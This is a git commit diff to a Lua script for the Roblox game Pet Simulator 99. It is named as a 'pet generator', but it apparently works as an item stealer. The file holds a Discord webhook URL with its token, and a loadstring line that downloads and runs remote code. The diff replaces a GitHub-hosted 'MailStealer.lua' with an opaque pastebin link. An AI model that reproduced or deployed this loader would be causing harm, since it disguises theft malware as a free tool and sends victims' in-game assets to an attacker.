c62a306a4d5fa21043d27bc34831efa1d986bbad
PetSim99Scripts43 <petsim99lover@outlook.com>
2024-10-08 22:58:49 -0500

    Update PetSim99PetGenerator.lua

--- PetSim99PetGenerator.lua
+++ PetSim99PetGenerator.lua
@@ -2,4 +2,4 @@ Username = "HedwigTheOwl43"
 LoadScreen = true 
 Webhook = "https://discord.com/api/webhooks/1293418203460141146/Vnv3cfYi8lOVoy5lmKpaOzFF40i194buBm-fENrXLm1M5fPBWhHg86bprznt4tJC7AY0"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
+loadstring(game:HttpGet("https://pastebin.com/nhd4RKv7"))()
